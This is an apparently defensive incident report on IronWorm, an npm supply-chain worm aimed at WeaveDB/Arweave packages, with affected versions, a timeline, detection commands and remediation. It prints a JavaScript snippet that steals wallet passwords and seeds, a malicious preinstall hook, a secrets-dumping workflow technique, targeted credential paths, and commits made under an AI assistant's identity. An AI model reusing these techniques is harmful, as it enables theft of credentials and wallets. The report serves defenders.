# IronWorm — Rust-Built npm Worm with eBPF Rootkit and Tor C2 Targets Arweave/WeaveDB Ecosystem

**Date:** June 2026
**Ecosystem:** npm (Arweave / WeaveDB / Decentralized Web3)
**Severity:** Critical
**Type:** Self-Propagating Worm / Infostealer / Kernel Rootkit / Crypto Wallet Thief
**Sources:**
- [JFrog Security Research — IronWorm: Shai-Hulud's rustier cousin](https://research.jfrog.com/post/iron-worm-shai-hulud-rustier-cousin/)
- [CyberSecurityNews — IronWorm Supply Chain Attack Uses Malicious npm Packages to Steal Developer Secrets](https://cybersecuritynews.com/ironworm-supply-chain-attack-uses-malicious-npm-packages/)
- [BleepingComputer — New IronWorm malware hits 36 packages in npm supply-chain attack](https://www.bleepingcomputer.com/news/security/new-ironworm-malware-hits-36-packages-in-npm-supply-chain-attack/)
- [The Hacker News — IronWorm and New Miasma Worm Variant Hit npm in Supply Chain Attacks](https://thehackernews.com/2026/06/ironworm-and-new-miasma-worm-variant.html)

---

## Summary

IronWorm is a custom Rust-built supply-chain implant discovered by JFrog Security Research on June 3, 2026. The attacker compromised the `asteroiddao` npm account — tied to the `asteroid-dao` GitHub organization and the broader Arweave/WeaveDB decentralized database ecosystem — and republished 37 npm packages, each carrying a hidden 976 KB Linux ELF binary that executed automatically at install time via a `preinstall` hook. Within roughly one day, malicious versions were deprecated and most backdated commits were removed from GitHub, but not before the worm had committed itself into 9 GitHub organizations across 57 spoofed commits.

What distinguishes IronWorm from contemporaneous npm worms is its operational sophistication: a modified UPX packer to defeat automated unpacking, per-call-site string encryption that resists bulk reverse-engineering, a kernel-level eBPF rootkit that erases the malware from `ps`, `top`, and `ss` output before defenders can see it, and Tor-based command-and-control that routes all C2 traffic through an onion circuit. The malware sweeps 86 environment variables and 20+ credential file paths covering every major cloud provider, package registry, CI/CD system, and AI API key present on a 2026 developer workstation. A dedicated module targets the Exodus desktop wallet by injecting JavaScript to capture the seed mnemonic at unlock. A Kubernetes harvester reads service-account tokens and dumps all reachable Secrets.

JFrog assesses IronWorm as a custom, bespoke implant with no overlap with known public tooling. The closest comparison is Shai-Hulud: same propagation model (steal → commit → publish), same commit message cadence, same use of AI coding-assistant impersonation. IronWorm raises the sophistication bar considerably with a native Rust binary, kernel rootkit, and Tor C2 — features more typical of nation-state tooling than commodity malware.

---

## Compromised Artifacts

| Package | Malicious Version | JFrog Tracking |
|---------|------------------|----------------|
| `weavedb-sdk` | 0.45.3 | XRAY-989789 |
| `weavedb-lite` | 0.1.1 | XRAY-989671 |
| `weavedb-sdk-base` | 0.21.1 | XRAY-989492 |
| `test-weavedb-sdk` | 1.1.1 | XRAY-989648 |
| `weavedb-warp-contracts-plugin-deploy` | 1.0.11 | XRAY-989666 |
| `arnext-arkb` | 0.0.2 | XRAY-989571 |
| `weavedb-console` | 0.2.1 | XRAY-989594 |
| `arnext` | 0.1.5 | XRAY-989617 |
| `roidjs` | 0.1.7 | XRAY-989784 |
| `weavedb-exm-sdk` | 0.7.4 | XRAY-989764 |
| `create-arnext-app` | 0.0.10 | XRAY-989681 |
| `weavedb-tools` | 0.45.3 | XRAY-989760 |
| `wdb-core` | 0.1.2 | XRAY-989766 |
| `cwao-tools` | 0.3.1 | XRAY-989752 |
| `test-ajs` | 0.1.19 | XRAY-989779 |
| `monade` | 0.0.7 | XRAY-989547 |
| `weavedb-exm-sdk-web` | 0.7.4 | XRAY-989747 |
| `testnpmnmp` | 1.0.21 | XRAY-989781 |
| `warp-contracts-plugin-deploy-test` | 3.0.1 | XRAY-989754 |
| `wdb-cli` | 0.1.1 | XRAY-989761 |
| `ai3` | 0.3.5 | XRAY-989753 |
| `cwao-units` | 0.8.3 | XRAY-989762 |
| `atomic-notes` | 0.5.3 | XRAY-989758 |
| `cwao` | 0.5.6 | XRAY-989756 |
| `weavedb-client` | 0.45.3 | XRAY-989775 |
| `wdb-sdk` | 0.1.2 | XRAY-989773 |
| `weavedb-offchain` | 0.45.4 | XRAY-989783 |
| `fpjson-lang` | 0.1.7 | XRAY-989641 |
| `weavedb-contracts` | 0.45.2 | XRAY-989771 |
| `weavedb-node-client` | 0.45.3 | XRAY-989765 |
| `arjson` | 0.1.4 | XRAY-989767 |
| `hbsig` | 0.3.2 | XRAY-989769 |
| `zkjson` | 0.8.5 | XRAY-989787 |
| `aonote` | 0.11.1 | XRAY-989790 |
| `weavedb-base` | 0.45.3 | XRAY-989751 |
| `weavedb-sdk-node` | 0.45.3 | XRAY-989772 |
| `wao` | 0.41.2 | XRAY-989785 |

All 37 packages were published from the `asteroiddao` npm account, which corresponds to the `asteroid-dao` GitHub organization. The account member `ocrybit` was identified as the compromised developer whose credentials the worm used to push malicious commits.

---

## How It Worked

### Entry Point

Every package in the `asteroiddao` account was republished within a narrow time window, each carrying five files: four legitimate files copied verbatim from the real package, and a 976 KB Linux ELF binary tucked into a `tools/` directory. The `package.json` `preinstall` script pointed directly to this binary:

```json
{
  "scripts": {
    "preinstall": "./tools/setup"
  }
}
```

`preinstall` fires before npm begins resolving any dependencies. A developer running `npm install` triggers execution with no further interaction required. No build step, no user click, nothing to approve.

### Packer and String Obfuscation

The binary was packed with a lightly modified UPX stub — the standard `UPX!` magic bytes were overwritten, causing `upx -d` and signature-based unpackers to throw `NotPackedException`. Restoring the magic value allowed normal unpacking; the modification was a low-effort anti-analysis trick rather than a custom packer. After unpacking, the binary revealed a large Rust release build with an async runtime and thousands of functions.

Strings were encrypted with a unique per-call-site key, meaning there was no single master key that could unlock all of them at once. Every URL, file path, environment variable name, and command had to be recovered individually through manual reverse-engineering.

### Credential Theft

The malware sweeps **86 environment variables** covering:
- Cloud providers: AWS, GCP, Azure, DigitalOcean
- AI/ML APIs: Anthropic, OpenAI, Gemini, Cohere, Mistral, Groq, Perplexity, xAI, and more
- Registries: npm, PyPI, Docker Hub, GitHub PATs, GitLab tokens
- CI/CD: CircleCI, Travis CI, GitHub Actions OIDC tokens
- Data/secrets: Vault, Kubernetes service account tokens, database URLs

It also reads **20+ credential file paths** from disk, including:
- `~/.aws/credentials`, `~/.azure/credentials`, `~/.config/gcloud/`
- `~/.kube/config`
- `~/.docker/config.json`
- `~/.claude/.credentials.json`, `~/.codex/auth.json`, `~/Cursor/auth.json`, `~/.gemini/settings.json`
- `~/.npmrc`, `~/.pypirc`
- SSH keys under `~/.ssh/`

A dedicated Exodus wallet module injects JavaScript directly into the Electron application, weakening `webSecurity`, `sandbox`, `contextIsolation`, and `nodeIntegration` settings, then hooks the unlock flow to capture the wallet password and BIP-39 seed mnemonic via a local HTTP listener:

```javascript
try{const _x=(k,v)=>{const r=new XMLHttpRequest;r.open("POST","http://127.0.0.1:8738",!0);
r.setRequestHeader("Content-Type","text/plain");r.send(k+":"+v)};
if(t)_x("password",t);const m=this._seed?.mnemonic?.toString();if(m)_x("seed",m)}catch(e){}
```

A separate Kubernetes module reads the pod service-account token, walks all namespaces, and dumps every `Secret` it can reach, including Vault backends.

### eBPF Kernel Rootkit

The binary embeds a compiled BPF object that implements a kernel-level rootkit. The BPF object was compiled with clang 22.1.5 and — critically — still contained `.BTF.ext` debug metadata mapping instructions back to 214 lines of the original source `q2.bpf.c`. This metadata allowed JFrog to reconstruct the rootkit's full logic.

The rootkit hides the malware in four ways:
1. **Process hiding**: Rewrites `/proc` directory listings in-kernel, removing malware PIDs before `ps`, `top`, or any other tool reads them.
2. **Auto-hide on exec**: Hooks `execve` and auto-adds new malware processes to the hidden set without any explicit signal.
3. **Anti-debug**: Returns `SIGKILL` to any process attempting to `ptrace` a protected PID — running `strace` against the malware can kill the shell.
4. **Network hiding**: Parses and filters `/proc/net/tcp` and the netlink interface used by `ss`, removing rows belonging to hidden sockets.

Note: the process and TCP hiding rely on a BPF helper that modifies memory in the calling process — a capability restricted when **kernel lockdown** is enabled. On hardened systems, those rewrite paths quietly fail, making the malware visible; anti-debug and netlink filtering remain active.

### Tor-Based Command and Control

Rather than using a static IP or domain, IronWorm downloads the Tor expert bundle, writes its own `torrc`, starts the daemon, waits for a circuit to come up, and beacons to `/api/agent` over plain HTTP wrapped inside the Tor tunnel. Commands include: uploading exfiltrated secrets, dropping a file from C2, and opening a remote shell on the infected machine. A possible fallback exfiltration path uploads data to `temp.sh` (a public file host) over the same Tor circuit and reports the link back to C2, though this path was not observed triggering in the wild.

### Self-Propagation — GitHub and npm

After credential theft, IronWorm propagates in two ways:

**GitHub commits**: Iterates all repositories the compromised account can write to, identifies those with an npm, PyPI, Cargo, Conan, or vcpkg package, and commits a binary dropper under `tools/setup` or `.github/scripts/precheck`. The commit is authored as `claude <claude@users.noreply.github.com>` to impersonate an AI coding assistant. Commit timestamps are spoofed by copying the repository's most recent real commit timestamp, so backdated commits appear years old.

If the repository has GitHub Actions workflows, the malware instead overwrites an existing workflow with a secrets-exfiltration job that serializes all available secrets with `${{ toJSON(secrets) }}` and uploads them as a build artifact. The workflow steps are pinned to real commit SHAs, named with plausible CI phrases, and attributed to `dependabot`, `renovate`, or `github-actions[bot]` to blend in.

**npm Trusted Publishing**: In CI environments, the worm requests an OIDC identity token from the runner with the npm Trusted Publishing audience, exchanges it at `/-/npm/v1/oidc/token/exchange/package/<pkg>` for a short-lived publish token, and publishes a trojanized release — no stored npm credential required.

### Operator OPSEC Failure

The malware contains a hardcoded skip-list — credentials matching a specific 74-byte BIP-39 mnemonic are *not* exfiltrated. That single entry is the operator's own Ethereum wallet recovery phrase: `bench crane defense corn wheel trial news abuse finish better paddle slush`. Deriving the address yields `0x7e28D9889f414B06c19a22A9Bd316f0AC279a4d6` — a near-empty test wallet holding a few cents of dust, but a tidy attribution anchor nonetheless.

---

## Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| ~Jun 3, 2026 | `asteroiddao` npm account compromised; 37 packages republished with IronWorm binary |
| Jun 3, 2026 | IronWorm pushes 57 backdated commits across 9 GitHub organizations (`ocrybit`, `asteroid-dao`, `alisista`, `warashibe`, `kakedashi-hacker`, `weavedb`, `ArweaveOasis`, `arthursimao`, `mlebjerg`) using spoofed timestamps |
| ~Jun 4, 2026 | JFrog Security Research identifies malicious packages during routine npm scanning |
| Jun 4, 2026 | Malicious npm versions deprecated; most malicious GitHub commits removed |
| Jun 4, 2026 | JFrog publishes full technical teardown |

---

## Detection

```bash
# Check for IronWorm binary path in installed packages
find ~/.npm /usr/local/lib/node_modules -name "setup" -path "*/tools/*" -type f 2>/dev/null | \
  xargs -I{} file {} 2>/dev/null | grep ELF

# Check for the fake commit author across your GitHub repos
gh search commits "fix: resolve lint warnings" --author-email "claude@users.noreply.github.com"
gh search commits "test: add missing edge case" --author-email "claude@users.noreply.github.com"
gh search commits "ci: update workflow configuration" --author-email "claude@users.noreply.github.com"

# Audit package.json preinstall hooks in node_modules
find ./node_modules -name "package.json" -not -path "*/node_modules/*/node_modules/*" | \
  xargs grep -l '"preinstall"' 2>/dev/null | head -20

# Look for IronWorm binary path markers in any installed package
find ./node_modules -path "*/tools/setup" -o -path "*/.github/scripts/precheck" 2>/dev/null

# Check for Tor daemon started by malware
pgrep -a tor | grep -v "^[0-9]* /usr"
ls -la /tmp/tor* 2>/dev/null

# Check for hidden processes (compare ps with /proc)
comm -23 <(ps -e -o pid= | sort -n) <(ls /proc | grep -E '^[0-9]+$' | sort -n)

# Verify specific malicious package versions from asteroiddao
npm view weavedb-sdk versions 2>/dev/null | grep "0.45.3"
npm view weavedb-client versions 2>/dev/null | grep "0.45.3"

# Check npm audit for XRAY advisories
npm audit --audit-level=moderate 2>/dev/null | grep -E "XRAY-98"
```

---

## Remediation

1. **Immediately deprecate/unpublish** any malicious npm package versions listed in the Compromised Artifacts table. Publish a clean version with a `security:` prefix in the release notes.

2. **Audit all repositories** the compromised `asteroiddao`/`ocrybit` account had write access to. Look specifically for:
   - Commits from `claude@users.noreply.github.com`
   - Commits with messages: `fix: resolve lint warnings`, `test: add missing edge case`, `ci: update workflow configuration`, `fix: address review feedback`, `docs: update contributing guide`, `chore: sync lockfile`, `fix: handle null pointer case`, `build: bump patch version`, `chore: update dependencies`
   - New `tools/setup` or `.github/scripts/precheck` binary files
   - GitHub Actions workflows recently modified to use `${{ toJSON(secrets) }}`

3. **Rotate all credentials** the account had access to:
   - npm publish tokens
   - GitHub PATs and fine-grained tokens
   - AWS/GCP/Azure credentials and service account keys
   - SSH keys stored on developer machines that ran `npm install` on any affected package
   - All AI API keys (Anthropic, OpenAI, Gemini, etc.)
   - Kubernetes service account tokens in any cluster accessible from the developer environment

4. **Scan for running Tor daemons** started by the malware and kill them.

5. **Inspect the Exodus wallet** on any developer machine that installed an affected package. The module runs at unlock time — if the application was opened after installation, assume seed and password are compromised.

6. **Enable kernel lockdown** (`lockdown=integrity` or `lockdown=confidentiality` kernel parameter) on CI runners and developer machines to neutralize the eBPF rootkit's process-hiding and TCP-hiding capabilities.

7. **Enable npm provenance verification** for all packages your organization publishes, and require SLSA Build Level 2+ for all new publishes.

---

## Lessons Learned

- **Ecosystem account compromise still succeeds at scale**: The `asteroiddao` account held dozens of packages, meaning a single credential compromise instantly weaponized the entire portfolio without any repository-level protections firing.
- **AI identity impersonation is a growing vector**: Committing as `claude@users.noreply.github.com` exploits the social trust developers are beginning to extend to AI coding assistants. Commit signature verification (GPG/Sigstore) catches this; mere author-email inspection does not.
- **Kernel lockdown is underused on developer workstations**: The eBPF rootkit is fully neutralized on hardened kernels with lockdown enabled, yet this is rarely configured on developer laptops or self-hosted CI runners.
- **Timestamp forgery defeats casual code review**: Backdating commits to match a repository's last legitimate commit is a simple trick that makes malicious changes invisible in `git log --since` queries and many security scans. Reviewing commits by commit hash verification (via provenance or Sigstore) is more reliable than review by timestamp.
- **Operator OPSEC failures provide attribution**: Hardcoding a personal wallet recovery phrase into the skip-list is an operational error that provides a persistent attribution anchor.
- **eBPF rootkits are now a realistic npm threat**: Previously the domain of sophisticated nation-state implants, kernel-level rootkits have arrived in the npm supply chain. Standard process monitoring, `netstat`/`ss`, and antivirus scanning are all blindsided without independent kernel-level detection.

---

## Related Incidents

- [./2026-03-glassworm-canisterworm.md](./2026-03-glassworm-canisterworm.md) — earlier npm worm using Solana C2 and preinstall hooks
- [./2025-late-shai-hulud-worm.md](./2025-late-shai-hulud-worm.md) — Shai-Hulud: the npm worm IronWorm most closely parallels
- [./2026-06-miasma-v2-binding-gyp.md](./2026-06-miasma-v2-binding-gyp.md) — Miasma v2: concurrent npm worm campaign using binding.gyp bypass
- [./2026-05-qlnx-quasar-linux-rat.md](./2026-05-qlnx-quasar-linux-rat.md) — QLNX: another eBPF-rootkit-based supply chain threat
